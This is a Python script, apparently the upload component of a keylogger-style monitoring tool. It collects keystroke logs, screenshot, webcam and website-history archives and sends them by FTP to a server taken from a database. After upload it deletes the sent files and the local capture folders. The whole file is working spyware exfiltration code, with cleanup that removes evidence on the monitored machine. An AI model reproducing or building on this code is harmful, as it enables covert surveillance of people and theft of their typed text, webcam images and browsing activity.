import ftplib
import os
from getsqldata import *
from datetime import datetime


def uploadFileFTP(sourceFilePath, destinationDirectory, server, username, password):
    destinationDirectory = os.path.join(destinationDirectory,datetime.now().strftime('%Y_%m_%d'))
    myFTP = ftplib.FTP(server, username, password)

    desName = []
    desPath = []
    #print(sourceFilePath, destinationDirectory)
    if(destinationDirectory.find('/') != -1):
        desPath = destinationDirectory.split('/')
    elif(destinationDirectory.find('\\') != -1):
        desPath = destinationDirectory.split('\\')

    if(sourceFilePath.find('/') != -1):
        desName = sourceFilePath.split('/')
    elif(sourceFilePath.find('\\') != -1):
        desName = sourceFilePath.split('\\')

    lastName = desName[-1]    
    if(desName[-1] == ''):
        lastName = desName[-2]
        
    temp = '\\'
    try:
        for i in desPath:
            if i != '' and i not in [name for name, data in list(myFTP.mlsd(temp))]:
                #print('PATH:'+i)
                print("Destination Directory does not exist. Creating it first")
                myFTP.mkd(os.path.join(temp,i))
            
            temp = os.path.join(temp,i)
            #print('TEMP : ' + temp)
    except Exception as e:
        print(str(e))
        pass

    myFTP.cwd(destinationDirectory)

    # need to change file name to avoid overwrite
    if os.path.isfile(sourceFilePath):
        if lastName in [name for name, data in list(myFTP.mlsd(destinationDirectory))]:
           lastName = datetime.now().strftime('%H_%M_%S')+'-'+lastName

        fh = open(sourceFilePath, 'rb')

##        for name,data in list(myFTP.mlsd()):
##            if
        myFTP.storbinary('STOR %s' %lastName, fh) # error here
        fh.close()
    else:
        print("Source File does not exist")

def DelSentLogs(files):
    for f in files:
        if(os.path.exists(f)):
            os.remove(f)
            
def DelCurrLogs(pathDir):
    if(os.path.exists(pathDir)):
        for i in os.listdir(pathDir):
            os.remove(os.path.join(pathDir, i))
    
def TotalFileSize(arr_file):
    size = 0
    for f in arr_file:
        if(os.path.exists(f)):
            size = size + os.path.getsize(f)
    return size >> 10

uid = getCurrentUser()
sv = getRowValue('FTPServer',uid)
conf = getRowValue('FTP',uid)

size = conf[9]
enSize = conf[8]

email = getRowValue('Users',uid)[1]
token = getRowValue('current_user',uid)[1]
#print(sv)
#keystrokeLogs = datetime.now().strftime('%Y_%m_%d-')+email+'-'+token+'.txt'

dir_path = getRowValue('Setting',uid) # thu muc chua file can gui
# cac file can gui
files = []
if (conf[4] == 1):
    for file in os.listdir(dir_path[1]):
        if file.endswith(email+'-'+token+".txt"):
            filePath = os.path.join(dir_path[1], file)
            print(filePath)
            files.append(filePath)
if (conf[5] == 1):
    files.append(os.path.join(dir_path[3],"Screenshot.zip"))
if (conf[6] == 1):
    files.append(os.path.join(dir_path[2],"Webcam.zip"))
if (conf[7] == 1):
    files.append(os.path.join(dir_path[5],"Website.zip"))
    
try:
    success = 0
    if(enSize == 1 and TotalFileSize(files) >= size):
        for f in files:  # add files to the message
            file_path = os.path.join(dir_path, f)
            if (os.path.exists(f)):
                print('File path: '+str(f))
                uploadFileFTP(f,sv[4],sv[1],sv[2],sv[3])
                success = 1
                print("Upload "+ str(f) + " sucessful!")
            else:
                print(str(f) + " does not exists!!!")
            
    elif(enSize == 0 and conf[1] == 1):
        for f in files:  # add files to the message
            #file_path = os.path.join(dir_path, f)
            if (os.path.exists(f)):
                print('File path: '+str(f))
                uploadFileFTP(f,sv[4],sv[1],sv[2],sv[3])
                success = 1
                print("Upload "+ str(f) + " sucessful!")
            else:
                print(str(f) + " does not exists!!!")
            

    if (success == 1):
        wc = getRowValue("Webcam",uid)
        if(conf[10] == 1):
            # delete sent log
            DelSentLogs(files)
            print("Del sent logs ok")
            # delete exists log in folder
            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))   
            DelCurrLogs(os.path.join(dir_path[3],"Screenshot"))
            DelCurrLogs(os.path.join(dir_path[5],"Website"))
            print("Del log in folder ok")
        elif(wc[7] == 1):
            # if email not set delete after upload successful,
            # check in webcam to delete
            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))
            print("Del webcam logs ok")

            
except Exception as e:
    print("Error : " + str(e))
